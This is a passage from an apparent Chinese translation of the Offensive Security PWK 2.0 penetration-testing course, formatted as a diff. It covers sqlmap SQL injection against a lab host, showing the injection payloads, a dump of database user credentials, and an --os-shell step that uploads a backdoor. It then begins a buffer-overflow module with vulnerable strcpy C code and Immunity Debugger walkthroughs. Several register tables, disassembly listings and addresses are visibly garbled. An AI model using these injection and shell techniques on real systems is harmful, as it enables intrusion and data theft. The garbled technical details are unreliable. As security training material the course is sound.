+对于剩余部分，你是否想包含扩展所提供的
+级别 (1) 和风险 (1) 值的所有 'MySQL' 的测试？ [Y/n] y
+[13:53:57] INFO 正在测试 'AND boolean-based bind - WHERE OR HAVING clause'
+```
+
+`sqlmap` 通过总共 47 次 HTTP(S) 请求识别出以下注入点：
+
+```
+Parameter: id (GET)
+Type: boolean-based bind
+Title: AND boolean-based bind - WHERE OR HAVING clause
+Payload: id-1 AND 8867=-8867
+```
+
+```
+Type: error-based
+Type: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+Payload: id=1 AND SELECT 6734 FROM (SELECT COUNT(*),CONCAT(0x7171a6a1,(SELECT (LT(6734-6734,1)),0x71a6b771,FLOOR(RAND(0)*2)) FROM INFORMATION_SCHEMA.PLUGINS GROUP BY X)a
+```
+
+
+
+Type: UNION query
+
+Type: Generic (null) - 3 columns
+
+Payload: `id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171a6a14b57696508715876c4b4b25936785371725045706fd6d5a4727ab466d,0x71a6b71)`
+
+
+```
+```
+
+[13:54:11] INFO DBMS 是 MySQL
+
+web operating system: Windows
+
+web application technology: Apache 2.4.31, PHP 7.0.33
+
+backend DBMS: MySQL >= 5
+
+[13:54:11] INFO 获取数据到文本文件 `/home/kali/.sqlmap/output/1.11.0.22-`
+
+如果参数用于 SQL 注入，`sqlmap` 可能会发出多个请求。当 `sqlmap` 为你工作时，发现了四种不同的利用技术。我们可以使用 `sqlmap` 自动从数据库中提取数据。我们将再次运行 `sqlmap`，设置 "MySQL" 为后端并 dump 数据库中的所有表。`sqlmap` 支持 `--dbms` 标志中的各种数据库，但不区分 MariaDB 和 MySQL。设置 "MySQL" 对于此示例足够了。
+
+```
+kali@kali:~ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+Database: webappdb
+Table: feedback [2 entries]
+```
+
+| id | text | name |
+
+|---|---|---|
+
+| 1 | Great tacos today! | Jake |
+
+| 2 | I would eat tacos every day! | Jake |
+
+```
+[13:56:58] INFO webappdb.feedback dump 到 CSV 文件 '/home/kali/.sqlmap/output/1.11.0.22/webappdb/feedback.csv'
+[13:56:58] INFO 获取数据库 'webappdb' 中表 users 的列
+[13:56:58] INFO 获取数据库 'webappdb' 中表 users 的记录
+Database: webappdb
+Table: users [2 entries]
+```
+
+| id | username | password |
+
+|---|---|---|
+
+| 1 | admin | password |
+
+| 2 | jigsaw | footwork |
+
+```
+[13:56:58] INFO webappdb.users dump 到 CSV 文件 '/home/kali/.sqlmap/10.11.0.22/webappdb/users.csv'
+[13:56:58] INFO 数据日志到文本文件 '/home/kali/.sqlmap/output/1.11.0.22'
+```
+
+![](img/f99f528ca9845f4c256ce54e882b1345_341_0.png)
+
+## 336 - 使用 sqlmap dump 数据库
+
+根据列表 336 的输出，`sqlmap` 能够 dump整个数据库的内容。在终端窗口 own内容的情况下，`sqlmap` 还创建了一个包含导出内容的 CSV 文件。
+
+Sqlmap 许多其他功能，例如攻击 Web 应用防火墙 `WAF` 以及执行复杂查询以自动接管服务器。例如，使用 `os-shell` 参数将尝试在目标上上传并执行远程命令。
+
+我们可以使用 `--os-shell` 运行此查询并在系统中执行：
+
+```
+kali@kali:~$ sqlmap -u http://10.11.0.2/debug.php?id=1 -p "id" --dbms mysql --os-shell
+...
+[14:00:59] [INFO] 尝试通过 LIMIT TERMINATED BY '0' 方法在 'C:\xampp\htdocs\' 上传文件
+[14:00:59] [INFO] 文件已上传到 'C:\xampp\htdocs\http://10.11.0.22/tmpwyrd.php
+[14:00:59] [INFO] 后门已上传到 'C:\xampp\htdocs\http://10.11.0.22/tmpbxtja.php
+[14:00:59] [INFO] 调用 OS shell。输入 'x' 或 'q' 并按回车
+os-shell ipconfig
+你是否想要检索命令的标准输出？ [Y/n] y
+```
+
+Windows IP 配置
+
+以太网适配器 Ethernet0:
+
+```
+Connection-specific DNS Suffix      : localhost
+Link-local IPv6 Address             : fe80::c5a0:cbd8:9f85%7
+IPv4 Address                        : 10.11.0.22
+Subnet Mask                         : 255.255.255.0
+Default Gateway                     : 10.11.0.1
+```
+
+以太网适配器 Bluetooth 网络
+
+```
+Media State                         : disconnected
+Connection-specific DNS Suffix      :
+```
+
+```
+os-shell>
+```
+
+列表 337 - 使用 sqlmap 获取 OS shell
+
+# OFFENSIVE SECURITY 使用 Kali Linux 2.0
+
+一旦 `sqlmap` 建立了 shell，我们就可以在服务器上运行命令，如 337 所示。这可能有点慢，但可以提供访问底层服务器的脚。
+
+请注意 OSC 考试不允许使用 `sqlmap`。但是，我们建议在实验室和 Windows 机器上使用它。结合 Burp 和 Wireshark 等工具观察工具在做什么，然后尝试手动复制。这是一种非常有效的学习方法，不应被忽视。
+
+## 9.4.5.13 练习
+
+- 1. 使用 `sqlmap` 获取数据库 dump。
+- 2. 使用 `sqlmap` 获取交互式 shell。
+
+## 9.5 额外
+
+Windows 10 实验室包含一个用于练习 XSS 和 SQL 注入漏洞的额外应用程序。该应用程序用 Java 编写，使用 Spring 框架并运行在 9090 端口。应用程序可以使用以下命令运行：
+
+```
+C:\tools\web_attacks> java -jar gadgets-1.0.0.jar
+
+2019-06-13 10:29:36.962 INFO 4976 --- [ main ]
+com.pwk.webapp.GadgetsApplication : Starting GadgetsApplication on DESKTOP-IPD21BB (C:\tools\web_attacks\gadgets-1.0.0.jar started by admin in C:\tools\web_attacks)
+
+2019-06-13 10:29:42.680 INFO 4976 --- [ main ]
+s.s.b.w.embedded.tomcat.TomcatWebServer : Tomcat started on port(s): 9090 (http) with
+2019-06-13 10:29:42.759 INFO 4976 --- [ main ]
+com.pwk.webapp.GadgetsApplication : Started GadgetsApplication in 7.047 seconds (JVM rtm)
+```
+
+一旦运行，我们就可以通过端口 9090 它：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_342_0.png)
+
+## 小配件与此类工具！
+
+我们是小配件、装置以及其他东西的最佳来源！如果你不确定它是做什么的，我们可能都有卖。现在就开始购物吧！
+
+![](img/f99f528ca9845f4c256ce54e882b1345_343_0.png)
+
+我们不会介绍应用程序所有的漏洞，尽管它至少包含 XSS 和 SQL 注入漏洞。要关闭应用程序，请使用 Ctrl+C 关闭命令窗口。
+
+## 9.5.1 练习
+
+（Web 中的 XSS 漏洞不需要报告）
+
+- 1. 识别并利用 Web应用程序中的 XSS 漏洞。
+- 2. 识别并利用 Web应用程序中的 SQL 注入漏洞。
+- 3. 是否可能通过 SQL 注入漏洞获取 shell？为什么可能或为什么不可能？
+
+### 9.6 总结
+
+
+
+在本模块中，我们关注常见 Web 漏洞的识别和枚举。我们还利用多种技术利用了几个常见的 Web 漏洞，包括管理控制台漏洞、跨站脚本、目录遍历、本地和远程文件包含以及 SQL 注入。这些攻击向量是我们用来构建更高级攻击的基础构建组件。
+
+# 缓冲区溢出简介
+
+在本模块中，我们将介绍缓冲区溢出背后的原理，缓冲区溢出是一种内存损坏漏洞。我们将回顾内存是如何使用的、缓冲区溢出是如何发生的，以及如何利用溢出控制应用程序的执行流。充分理解使这种攻击可能的条件，对于开发利用此类漏洞的利用程序至关重要。
+
+## 10.1 x86 架构简介
+
+为了理解内存损坏是如何发生的以及如何将其转化为未经授权的访问，我们需要讨论程序内存，理解软件在 CPU 层的工作原理，并概述一些基本定义。
+
+> 在讨论这些原理时，我们经常提到汇编语言 (`asm`)²⁹¹，这种极低级的编程语言与 CPU 内置的机器指令非常对应。
+
+### 10.1.1 程序内存
+
+当二进制应用程序执行时，它会在现代计算机使用的内存边界内以特定的方式分配内存。图 178 显示了 Windows 如何在最低内存地址 (`0x00000000`) 和应用程序使用的最高内存地址 (`0x7FFFFFFF`) 之间分配进程内存：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_344_0.png)
+
+# 攻击性安全
+
+使用 Kali Linux 进行渗透测试
+
+| 低内存地址 |  |
+| :--- | :--- |
+| 0x00000000 | 栈 (Stack) |
+| 0x00400000 | 程序映像 (Program Image) |
+| | 进程环境块 (PEB) |
+| | 线程环境块 (TEB) |
+| | 堆 (Heap) |
+| 0x7FFDF000 | 动态链接库 (DLL) |
+| 0x7FFFFFFF | 高内存地址（内核内存空间） |
+| |  |
+
+图 178：Windows 中的程序内存剖析
+
+尽管图中概述了几个内存区域，但出于我们的目的，我们将仅关注栈。
+
+#### 10.1.1.1 栈
+
+当线程运行时，它从程序映像或各种动态链接库 (`DLLs`) 执行代码。⁹² 线程需要一个用于函数、局部变量和程序控制信息的短期数据区域，称为栈。³ 为了方便多个线程独立执行，运行应用程序中的每个线程都有自己的栈。
+
+CPU 将栈内存视为“后进先出”（LIFO）结构。这本质上意味着访问栈时，栈顶的元素（入栈）会被移除（弹出）。x86 架构实现了专门的 `PUSH` 和 `POP` 指令来分别从栈中添加或删除数据。
+
+⁹² (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-libraries
+
+³ (Tutorials Point, 2020), https://www.tutorialpoint.com/assembly_programming/assembly_procedures.htm
+
+PWK 2.0
+
+© Offensive Security Ltd. 保留。
+
+346
+
+使用 Kali Linux 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_346_0.png)
+
+可能还需要一个长期且更动态的数据存储区域，称为堆⁹⁴ 但由于我们专注于基于栈的缓冲区溢出，我们将在本模块中不讨论堆内存。
+
+#### 10.1.1.2 函数返回机制
+
+当代码调用函数时，它必须知道函数完成后返回到哪个地址。此“返回地址”（以及函数的参数和局部变量）存储在栈上。这组数据与一次函数调用相关，并存储在栈内存的一个区域，称为栈帧 (`stack frame`)。图 179 展示了一个栈帧示例。
+
+| 线程栈帧示例 |
+| :--- |
+| 函数 A 返回地址：0x00401024 |
+| 函数 A 的参数 1：0x0000040 |
+| 函数 A 的参数 2：0x0000100 |
+| 函数 A 的参数 3：0xFFFFFFFFFF |
+
+图 179：栈上的返回地址
+
+当函数结束时，从栈获取返回地址并将执行恢复到主程序或调用函数。虽然这描述的是高层过程，但我们必须更多地了解这在 CPU 层是如何实现的。本讨论了 CPU *寄存器*²⁹⁵
+
+### 10.1.2 CPU 寄存器
+
+为了执行高效代码，CPU 维护并使用一系列九 32 位寄存器（在 32 位平台上）。寄存器是小型、极高速的 CPU 存储位置，可以在其中高效地读取或操作数据。这九个寄存器（包括这些寄存器高低位的命名）如图 180 所示。
+
+294 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-libraries
+
+295 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/desktop/hardware
+
+PWK 2.0
+
+© Offensive Security Ltd. 保留。
+
+347
+
+使用 Kali Linux 进行渗透测试
+
+| 寄存器 | 低 8 位 | 高 8 位 |
+| :--- | :--- | :--- |
+| EAX | AX | AH |
+| EBX | BX | BH |
+| ECX | CX | CH |
+| EDX | DX | DL |
+| ESI | SI | SH |
+| EDI | DI | DH |
+| EBP | BP | BH |
+| ESP | SP | HP |
+| EIP | IP | HI |
+
+图 180：CPU 寄存器
+
+在我们讨论这些原理时，我们经常提到汇编语言 (`asm`)²⁹¹，这种极低级的编程语言与 CPU 内置的机器指令非常对应。
+
+## 10.2.1 示例漏洞代码
+
+下面的列表展示了一个非常基础的 C 源代码，该程序存在缓冲区溢出漏洞。
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+    char buffer[64];
+
+    if (argc < 2)
+    {
+        printf("Error - You must supply at least one argument\n");
+        return 1;
+    }
+
+    strcpy(buffer, argv[1]);
+    return 0;
+}
+```
+
+列表 339 - 一个有漏洞的 C 函数
+
+如果你从未处理过 C 代码，那么理解上述列表所示逻辑应该相当容易。首先，值得注意的是在 C 语言中，`main` 函数被对待得与其他任何函数都相同；它可以接收参数、向调用程序返回返回值等。唯一的区别是，它在进程启动时是由操作系统本身“调用”的。
+
+在这种情况下，`main` 函数定义了一个名为 `buffer` 的字符数组，可以容纳多达 64 个字符。由于该变量定义在函数内部，编译器$^{298}$ 将其视为局部变量$^{299}$，并在栈上为其预留空间（64 字节）。当程序运行时，这段特定的内存将在其执行期间的 `main` 函数栈帧内被预留。
+
+> 正如名称所示，局部变量具有范围$^{300}$，这意味着它们仅在声明它们的函数或代码块内部可访问。相比之下，全局变量$^{301}$ 存储在程序的 `.data` 段，这是程序的一个不同内存区域，所有应用程序代码都可以全局访问。
+
+$^{298}$ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Compiler
+
+$^{299}$ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Local_variable
+
+$^{300}$ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Scope_(computer_science)
+
+$^{301}$ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Global_variable
+
+# 攻击性安全
+
+程序继续执行 `strcpy`$^{302}$ 将给定命令行参数 `argv[1]` 的内容拷贝到 `buffer` 中。注意，C 语言原生不支持字符串作为一种数据类型。在底层，字符串是一个以空字符（`'\0'`）结尾终止的字符序列，或者是另一个一维字符数组。
+
+最后，程序终止执行并向操作系统返回零（标准成功退出代码）。
+
+当我们调用此程序时，我们将通过两个参数 `argc` 和 `argv` 的帮助来传递命令行参数，这两个参数分别代表传递给程序的参数数量（以整数形式传递）以及指向参数本身“字符串”的指针数组。
+
+如果传递给 `main` 函数的参数是 64 个字符或少，该程序将按预期工作并正常退出。然而，由于没有对输入的大小进行检查，如果参数较大（例如 80 字节），目标 `buffer` 相邻的栈部分将被剩余的 16 个字符覆盖，从而溢出数组边界。这在图 182 中所示。
+
+
+
+| 在 strcpy 之前 | 拷贝 32 个 A | 拷贝 80 个 A |
+| :--- | --- |--- |
+| strcpy 目标地址 | strcpy 目标地址 | strcpy 目标地址 |
+| strcpy 源地址 | strcpy 源地址 | strcpy 源地址 |
+| 预留缓冲区内存 | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
+| 预留缓冲区内存 | AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAA |
+| 预留缓冲区内存 | 预留缓冲区内存 | AAAAAAAAAAAAAAAA |
+| 预留缓冲区内存 | 预留缓冲区内存 | AAAAAAAAAAAAAAAA |
+| main 的返回地址 | main 的返回地址 | A |
+| Main 参数 1 | Main 参数 1 | A |
+| Main 参数 2 | Main 参数 2 | A |
+
+![](img/f99f528ca9845f4c256ce54e882b1345_350_0.png)
+
+这种内存损坏的影响取决于多个因素，包括溢产生的大小及其包含的数据。要看这在我们的场景中是如何工作的，我们可以对应用程序应用一个超大参数并观察其效果。
+
+> 302 (linux.die.net), https://linux.die.net/man/strcpy
+> 303 (GBdirect), https://publications.gbdirect.co.uk/c_book/10/arguments_to_main
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+## 10.2.2 引入 Immunity Debugger
+
+我们可以使用应用程序调试器来协助漏洞利用过程。调试器充当应用程序和 CPU 之间的代理，允许我们随时停止执行流，以检查寄存器内容以及进程内存。在通过调试器运行应用程序时，我们可以一次执行一条汇编指令，以更好地理解代码的详细流程。有很多调试器，我们将使用 Immunity Debugger，它的界面相对简单，并允许我们使用 Python 脚本来自动化任务。我们可以尝试溢出我们漏洞应用程序中的缓冲区，并使用 Immunity Debugger 理解程序在每个阶段发生了什么。要启动 Immunity 并执行代码，我们将从桌面的快捷方式启动它，并导航到 `File > Open`，如图 183 所示。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_351_0.png)
+
+在对话框中，导航到 `buffer_overflow` 目录并打开 `strcpy.exe`，这是上一节分析源代码的编译版本。在点击 `Open` 之前，我们将如图 184 所示添加 12 个 "A"。这 12 个字符将作为程序的命令行参数并被 `strcpy` 函数使用。
+
+> 304 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Debugger
+> 305 (Immunity, 2019), https://www.immunity.com/products
+
+当调试器启动时，应用程序的执行流将在入口点$^{306}$ 暂停。遗憾的是，在这个例子中，入口点与 `main` 函数不重合。这是由编译器设置的一段代码以帮助程序执行，除这些外，还包括设置所有参数。在继续之前，让我们更熟悉 Immunity 以及最相关的功能。图 185 显示了主界面，它分为四个面板。
+
+图 184：加载应用程序
+
+> 306 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Entry_point
+
+左上窗口显示组成应用程序的汇编指令。蓝色高亮的指令 `SUB ESP,0C` 是下一个执行的汇编指令，它位于内存地址 `0x00401E0`。
+
+```assembly
+00041E00  83EC              SUB ESP,EC
+00041E03  C7 45 F4 F0          MOV DWORD PTR:[ESP+398],0
+00041E0A  E8 6E 63 00          CALL strcpy.00041768
+00041E12  89 C5 6FFFF      MOV ESP,ESP
+00041E17  E8              CALL strcpy.0041170
+00041E1A  90              NOP
+00041E1C  90              NOP
+00041E1E  90              NOP
+00041E20  55              PUSH ESP
+00041E25  56              PUSH ESI
+00041E27  83EC 18          SUB ESP,18
+00041E2B  C7 45 DC 0C      MOV DWORD PTR:[ESP+40C]
+00041E32  E8 5A 00 00          CALL TEST_ERX
+00041E37  6A 14              PUSH "libc-16.dll"
+00041E3C  C7 04 24 000000  MOV DWORD PTR:[ESP],0004000
+00041E40  E8 FF FF FF          CALL [KERNEL32.GetHandleA]
+00041E45  89 C5 6FFFF      MOV ESP,ESP
+00041E47  E8              CALL TEST_ERX
+00041E49  74 16              JZ 66
+00041E4D  00000000          DB 00
+00041E4F  C7 04 24 000000  MOV DWORD PTR:[ESP],0000000
+00041E53  89 44 24 04          MOV DWORD PTR:[ESP+4],0004000
+00041E57  6A 19              PUSH "RegisterClasses"
+00041E5C  C7 04 24 0C0000  MOV DWORD PTR:[ESP],000000C
+00041E62  E8 28 00 00          CALL [KERNEL32.GetProcAddress]
+00041E62  59              POP ESI
+00041E63  C9 EC              LE ESP,ESP
+00041E65  E8              CALL TEST_ERX
+00041E67  55              PUSH ESP
+00041E68  56              PUSH ESI
+00041E6A  83EC 26          SUB ESP,26
+00041E6E  C7 45 BC 3C0000  MOV DWORD PTR:[ESP+3BC],000003C
+00041E72  C7 04 24 320000  MOV DWORD PTR:[ESP],00000032
+00041E76  C7 04 24 000000  MOV DWORD PTR:[ESP],0000000
+00041E7A  89 45 60          MOV DWORD PTR:[ESP+60],00041560
+00041E7E  E8 00 00 00          CALL strcpy.00041500
+```
+
+![](img/f99f528ca9845f4c256ce54e882b1345_354_0.png)
+
+右上角（图 187）包含了所有寄存器，包括我们最感兴趣两个：`ESP` 和 `Eip`。根据定义，`EIP` 指向要执行的下一个代码指令，它被设置为 `0x00401E0`，即汇编窗口中高亮的指令（图 185）：
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+
+
+```
+Registers (FPU)
+<                <
+EAX 000414E0 stpy,<ModuleEntryPoint>
+EDX 000414E0 stpy,<ModuleEntryPoint>
+ECX 00041FF8
+EBP 000414E0 stpy,<ModuleEntryPoint>
+EDI 000414E0 stpy,<ModuleEntryPoint>
+ESP 000414E0 stpy,<ModuleEntryPoint>
+C 000000C0 32bit (FFFFFFFF)
+P1 000001B2 32bit (FFFFFFFF)
+P2 000001B2 32bit (FFFFFFFF)
+D1 000001B2 32bit SEC0000 (FFF)
+T 00000000 NULL
+U 0 LastErr ERROR_NOT_SUPPORTED (00000032)
+EFL 00000246 (NO,HB,E,BS,HS,PE,BE,LE)
+st1 empty
+st2 empty
+st3 empty
+st4 empty
+st5 empty
+st6 empty
+st7 empty
+32 10 ESP U0ZDI
+FST 00000068 08 32bit Err 00 00 00 00 (GT)
+FMW 0627 Pxc EAX,S3 Mask 1 1 1 1 1
+```
+
+图 187：Immunity Debugger 寄存器窗口
+
+右下角的窗口（图 188）显示了栈及其内容。此视图包含四列：内存地址、位于该地址的十六进制数据、数据的 ASCII 表示，以及在可用时提供与特定栈条目相关附加信息的动态注释。数据本身（第二列）以 32 位值（称为 DWORD）的形式显示，以四个十六进制字节的形式呈现。注意，该面板在栈顶显示了地址 `0x0065FF84`，这实际上是存储在寄存器窗口（图 187）中 `ESP` 中的值：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_355_0.png)
+
+```
+0055FF84 748195F4 RETURN TO KERNEL32.748195F4
+0055FF98 003E0B00
+0055FF90 08F5E7A0 * CALL KERNEL32.BaseThreadInThunk
+0055FF94 0066FF00 .BYTE
+0055FF9C 88F5F993 RETURN to ntdll.770222CA
+0055FFD0 88F5F993 JAI
+0055FF88 00000000 .BYTE
+0055FFA8 00000000 .BYTE
+0055FFB4 00000000 .BYTE
+0055FFBC 00000000 .BYTE
+0055FFC4 00000000 .BYTE
+0055FFC0 88F5F993 JAI
+0055FFE8 00000000 .BYTE
+0055FFC6 0066FF04 .BYTE Pointer to next SE record
+0055FFD0 SE handler
+0055FFD4 FC9F5707 .Jmp
+0055FE00 00000000 .BYTE
+0055FFE2 77022299 00 RETURN to ntdll.77022299
+0055FFF0 FFFFFFFFF FF
+0055FFF4 2E000000 End of SE chain
+0055FFF8 00000000 .BYTE
+0055FFF0 00000000 .BYTE
+0055FF04 00414600 .BYTE
+0055FF08 88F5F993 JAI stpy.(ModuleEntryPoint)
+0055FF10 003E0B00 .BYTE
+```
+
+图 188：Immunity Debugger 栈
+
+最后一个窗口位于左下角，显示任何给定地址的内存内容。与栈窗口类似，它显示了三列，包括内存地址和数据的 ASCII 表示。正如顾名义，此窗口在搜索或分析进程内存空间中的特定值时非常有帮助，并且可以通过右键点击窗口访问上下文菜单，以不同的格式显示数据。
+
+| | |
+
+|---|---||
+
+| 备份 (Backup) | |
+
+| 搜索 (Search for) | |
+
+| 转到 (Go to) | |
+
+| 十进制 (Hex) | ASCII (64 chars) |
+
+| 文本 (Text) | ASCII (32 chars) |
+
+| 短 (Short) | Unicode (64 chars) |
+
+| 长 (Long) | Unicode (64 chars) |
+
+| 浮点 (Float) | Unicode (32 chars) |
+
+| 反汇编 (Disassemble) | |
+
+| 特殊 (Special) | |
+
+| 外观 (Appearance) | |
+
+图 189：Immunity Debugger 窗口
+
+## 10.2.3 代码导航
+
+在熟悉调试器的各个窗口后，现在是时候导航汇编代码了。应用程序加载后，程序执行已停止，如调试器右下角的“Paused”（暂停）字样所示。如上一节所述，调试器会在程序入口点自动暂停。我们现在可以使用 `Debug > Step into`（单步进入）或 `Debug > Step over`（单步跳）命令来逐条执行指令，这两个命令的快捷键分别为 `F7` 和 `F8`。两者的区别在于 `Step into` 将跟踪执行进入指定的函数，而 `Step over` 将执行整个函数并返回。
+
+由于入口点与 `main` 函数的开头不重合，我们的第一个目标是找到 `main` 函数的位置。在此应用程序中，我们可以搜索进程内存中的以下错误消息来确定方向：
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[])
+{
+    char buffer[64];
+
+    if (argc < 2)
+    {
+        printf("Error - You must supply at least one argument\n");
+        return 1;
+    }
+
+    strcpy(buffer, argv[1]);
+
+    return 0;
+}
+```
+
+错误消息可以帮助我们定位 `main` 函数。为了搜索，我们在汇编窗口内右键点击并选择“Search for All strings”（搜索所有字符串）：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_358_0.png)
+
+结果窗口（图 190）清晰地显示了我们要找的字符串。
+
+图 191：Immunity Debugger 窗口
+
+找到了错误消息，我们可以返回主函数的位置。双击该行返回汇编视图，但这次是在 `main` 函数内部。在 192 中，我们识别了显示错误字符串的指令以及 `strcpy` 函数的调用。我们感兴趣的是 `strcpy` 函数调用，因此可以在该指令上设置断点。
+
+> （维基百科，2019），https://en.wikipedia.org/wiki/Breakpoint
+
+图 193：在 `strcpy` 函数上设置断点，我们选择了该函数的调用
+
+要在地址 `0x0004015AA` 设置断点，请按 `F2`。设置后，调试器将如图 193 所示用浅蓝色突出该行。
+
+接下来，通过选择 `Debug > Run`（运行）或按 `F5` 继续执行。几乎立即，执行就会在我们设置断点的函数 `0x0004015AA` 调用之前停止了。
+
+图 194：执行 strcpy
+
+如图 194 所示，执行已在 `strcpy` 指令（地址 `0x0004015AA`）处暂停。`EIP` 设置为该地址，因为指向下一个要执行的指令。在栈中，我们找到了从命令行输入的十二个“A”字符（`src = "AAAAAAAAAAAA"`）
+
+以及这些字符将复制到的 64 字节缓冲区变量的地址 (`dest = 0065FE70`)。
+
+我们现在可以步入 `strcpy` 调用（`Debug > Step into` 或 `F7`）。注意，上层汇编窗口中的地址已经发生了变化，因为我们现在进入了 `strcpy` 函数内部。这如图 195 中高亮显示的地址 (`0x7648E590`) 所示的：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_361_0.png)
+
+图 195：strcpy 执行前的堆栈布局
+
+我们现在可以双击堆栈面板中的 `strcpy` 目标地址 (`0x065FE70`)，以便更好地监控在该地址处发生的内存操作。该地址在图 196 中用红色箭头标出：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_361_1.png)
+
+图 196：监控内存操作
+
+如图 197 所示，这稍微改变了堆栈面板的视图。现在，我们在真实地址的左侧列看到了相对（正和负）偏移量：
+
+# 攻击性安全
+
+基于 Kali Linux 的渗透测试 2.0
+
+| 偏移量 | 值 | 描述 |
+
+| :--- | :--- | :--- |
+
+
+
+| -14 | 0004015AF | $so, 从 strcpy.0004015AA CALL 到 strcpy |
+| -13 | 0005FE70 | pwe, dest = 0005FE70 |
+| -12 | 0005FE74 | edi, src = 0000AAAAAAA |
+| -11 | FFFFFFFF |  |
+| -10 | 00000000 |  |
+| -09 | 00000000 |  |
+| ==> | 0004016A | IA, 从 <JMP.&msvcrt>._getmainargs> RETURN 到 strcpy.00040116A |
+| -07 | 00000000 |  |
+| -06 | 00040168 | B, 从 strcpy.0004015C0 RETURN 到 strcpy.0004016B |
+| -05 | 00040160 | A, strcpy.000401A0 |
+| -04 | 40000000 |  |
+| -03 | 00000000 |  |
+| -02 | 00000000 |  |
+| -01 | 7FF77C2B | e, 从 ntdll.77C7C2C0 RETURN 到 ntdll.0007C7C2A |
+| 00 | 00005F88 | C, 从 strcpy.00040180 RETURN 到 strcpy.000401FB |
+| 01 | 000401A0 | A, strcpy.000401A0 |
+| 02 | 00000000 |  |
+| 03 | 00000000 |  |
+| 04 | 00000000 |  |
+| 05 | 00000000 |  |
+| 06 | 00000000 |  |
+| 07 | 000401E3 | B, 从 strcpy.000401570 RETURN 到 strcpy.000401E3 |
+| 08 | 00000000 |  |
+| 09 | 00000000 |  |
+| 0A | 00781150 | M, M. |
+| 0B | 00000000 |  |
+| 0C | 00000000 |  |
+| 0D | 00000000 |  |
+| 0E | 00000000 |  |
+| 0F | 00000000 |  |
+| 10 | 00000000 |  |
+| 11 | 00000000 |  |
+| 12 | 00000000 |  |
+
+图 197：带有相对偏移量的堆栈布局，现在用箭头 (>) 高亮显示
+
+让我们仔细观察这个堆栈窗口。首先，注意偏移量零（现在上方高亮）是地址 `0x065FE70`。这是目标缓冲区的起始，我们输入的 A 字符字符串将复制到这里。由于我们在程序中定义了一个 64 字节的缓冲区，我们的缓冲区从偏移量 0 延伸到 +40，包括空终止符。
+
+注意，此缓冲区中似乎存在返回地址（偏移量 +C、+1C 和 +2C）以及其他数据。由于由于我们在定义缓冲区时没有对其进行初始化或清空，该空间充满了残留数据，调试器会尝试解释这些数据。当需要复制 A 数组到缓冲区时，这些数据将被覆盖。
+
+接下来，注意堆栈顶部的返回地址 `0x004015AF`。这是 `strcpy` 完成后我们将返回的地址，它与图 194 所示的 `MOV EAX` 指令对应。`CALL <JMP.&msvcrt>` 指令带我们来到这里，并自动将该地址推入堆栈。
+
+此时，我们可以让执行继续到 `strcpy` 函数结束（Debug > Execute until return）。这将让我们看到 `strcpy` 函数的结果：
+
+PWK 2.0 © Offensive Security Ltd. 保留所有权利
+
+# 攻击性安全
+
+## 基于 Kali Linux 的渗透测试 2.0
+
+| 偏移量 | 值 | 描述 |
+| :--- | :--- | :--- |
+| S-14 | 0004015AF | $0. 从 <JMP.&msvcrt> RETURN 到 strcpy.004015AF |
+| S-10 | 0065FE70 | pe. "AAAAAAAA" |
+| S-10 | 0065FE7A | AA. "AAAAAAAA" |
+| S-8 | FFFFFFFF | == 41414141 A |
+| S+4 | 41414141 | AAAA |
+| S+8 | 41414141 | AAAA |
+| S-10 | 00401600 | $0.strcpy.00401600 |
+| S-12 | 0065FE90 | ye |
+| S-16 | 77C77C2A | RETURN 到 ntdll.77C7C2C0 |
+| S-20 | 00000000 |  |
+| S-24 | 00000000 |  |
+| S-28 | 00000000 |  |
+| S-2C | 004016FB | $0. 从 strcpy.00401680 RETURN 到 strcpy.004016FB |
+| S-30 | 004016A0 | $0.strcpy.004016A0 |
+| S-34 | 00000000 |  |
+| S-38 | 00000000 |  |
+| S-3C | 00000000 |  |
+| S-40 | 00000000 |  |
+| S-44 | 0065FF00 |  |
+| S-46 | 004013E3 | 从 strcpy.00401570 RETURN 到 strcpy.004013E3 |
+
+图 198：`strcpy` 执行后带有相对偏移量的堆栈布局
+
+在图 198 中，`strcpy` 将十二个 "A" 字符复制到堆栈（缓冲区中），我们显然处于定义的缓冲区缓冲区 64 字节限制之内。在继续之前，注意位于缓冲区偏移 `0x4C`（图 198）处的地址 (`004013E3`)。这是主函数的返回地址，即主函数执行完成后我们将返回的地址。我们将很快看到这一操作。
+
+现在 `strcpy` 函数已完成执行且所有数据都已复制到目标缓冲区，是时候将执行返回图 199 所示的 `RET` 汇编指令了。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_363_0.png)
+
+图 199：从 `strcpy` 返回到 `main`
+
+此 `RET` 指令将堆栈顶部的值（图 199 中的 `0x04015AF`，相对偏移量 -0x14）“弹出”到 `EIP` 寄存器中，指示 CPU 下一步执行该位置的代码。
+
+如果我们单步执行这条 `RET` 指令（Debug > Step into 或 F7），我们将如预期地返回到主函数地址 `0x04015AF`，因为这是 `strcpy` 调用之后的下一个地址。
+
+PWK 2.0 © Offensive Security Ltd. 保留所有权利。
+
+# 基于 Kali Linux 的渗透测试 2.0
+
+# 攻击性安全
+
